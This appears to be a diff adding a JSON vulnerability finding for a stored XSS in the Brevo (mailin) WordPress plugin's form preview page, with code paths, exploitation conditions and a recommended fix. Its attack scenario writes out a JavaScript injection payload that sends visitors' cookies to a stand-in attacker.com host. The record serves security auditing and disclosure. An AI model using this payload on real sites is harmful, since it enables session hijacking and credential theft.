@@ -1,0 +1,69 @@
+{
+  "id": "mailin-xss-001",
+  "plugin": "mailin",
+  "plugin_display_name": "Brevo (formerly Sendinblue)",
+  "wordpress_org_slug": "mailin",
+  "vulnerability_class": "stored_xss",
+  "subtype": "javascript_injection",
+  "severity": "low",
+  "cvss_v3_score": 4.8,
+  "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N",
+  "title": "Stored XSS via JavaScript Injection in Turnstile Captcha Theme Parameter on Unauthenticated Form Preview Page",
+  "status": "CONFIRMED",
+  "confirmed_at": "2026-06-16",
+
+  "description": "The Brevo (mailin) WordPress plugin echoes the stored `cCaptchaStyle` form setting directly inside an inline `<script>` block on the form preview page without any JavaScript-context escaping. The value is stored in the plugin's custom database table when an administrator saves a subscription form, with only `sanitize_text_field()` applied — which strips HTML tags but preserves all JavaScript-injection-relevant characters (double quotes, semicolons, parentheses, commas). The preview URL (`/?sib_form=<id>`) is rendered by `sib_parse_request()` hooked to `parse_request`, with no authentication check or nonce verification, making it accessible to unauthenticated visitors.",
+
+  "attack_scenario": {
+    "actor": "Administrator (manages plugin settings)",
+    "victim": "Any user (including unauthenticated visitors) who browses the form preview URL",
+    "steps": [
+      "1. Attacker gains WordPress administrator access (e.g., compromised admin credentials, malicious plugin scenario, or insider threat).",
+      "2. Attacker navigates to the Brevo plugin's form editor and saves a subscription form with a crafted `turnstile_captcha_theme` value, e.g.: light\",callback:function(){fetch('https://attacker.com/?c='+document.cookie)},x:\"",
+      "3. The value passes sanitize_text_field() validation (no HTML tags stripped, JS-special chars preserved) and is stored in the `mailin_forms` database table's `cCaptchaStyle` column.",
+      "4. Any unauthenticated user visiting /?sib_form=<form_id> receives a page where the injected value is rendered inside a <script> block as: theme: light\",callback:function(){fetch('https://attacker.com/?c='+document.cookie)},x:\",",
+      "5. The injected JavaScript executes in the visitor's browser, enabling session hijacking, credential theft, or further exploitation."
+    ]
+  },
+
+  "vulnerable_code": {
+    "file": "plugins/src/mailin/inc/sib-form-preview.php",
+    "line": 74,
+    "snippet": "theme: <?php echo $cCaptchaStyle; ?>,",
+    "context": "Inside <script type=\"text/javascript\"> block, inside turnstile.render() call. $cCaptchaStyle comes from $formData['cCaptchaStyle'] read via SIB_Forms::getForm($sib_form_id) at line 17."
+  },
+
+  "write_path": {
+    "file": "plugins/src/mailin/page/page-form.php",
+    "line": 988,
+    "snippet": "$cCaptchaStyle = isset( $_POST['turnstile_captcha_theme'] ) ? sanitize_text_field( $_POST['turnstile_captcha_theme'] ) : '';",
+    "auth_check": "current_user_can('manage_options') at line 952",
+    "nonce_check": "check_admin_referer('sib_setting_subscription') at line 957",
+    "sanitizer": "sanitize_text_field() — strips HTML/PHP tags but NOT JavaScript-context special characters"
+  },
+
+  "read_path": {
+    "file": "plugins/src/mailin/sendinblue.php",
+    "hook": "parse_request",
+    "function": "sib_parse_request()",
+    "line": 1507,
+    "auth_check": "NONE",
+    "nonce_check": "NONE",
+    "access": "Fully unauthenticated via GET /?sib_form=<form_id>"
+  },
+
+  "conditions_for_exploitation": {
+    "write_privilege": "manage_options (WordPress administrator)",
+    "read_privilege": "None (unauthenticated)",
+    "special_config_required": "Turnstile captcha must be enabled on the target form (selectCaptchaType == 3 and gCaptcha != 0), otherwise the vulnerable code path at line 74 is not reached",
+    "user_interaction_required": "Victim must visit the preview URL (link delivery via email, social engineering, etc.)"
+  },
+
+  "fix_recommendation": "Replace `echo $cCaptchaStyle;` at sib-form-preview.php:74 with `echo esc_js($cCaptchaStyle);` or, better, `echo json_encode($cCaptchaStyle);` to ensure the value is properly quoted and escaped for a JavaScript string context. Additionally, consider restricting access to the preview page to logged-in users with sufficient capability (e.g., `manage_options`) by adding a `current_user_can()` check in `sib_parse_request()`.",
+
+  "notes": [
+    "The form preview page is intentionally accessible without authentication to allow designers/marketers to preview forms without login. This design decision amplifies the impact of any injection in the preview rendering code.",
+    "The three push-admin XSS flows (mailin-xss-002/003/004) flagged by the automated scanner are false positives — they reflect only hardcoded constant strings from ternary expressions.",
+    "The SSRF finding (mailin-ssrf-001) is a false positive — the URL is hardcoded."
+  ]
+}
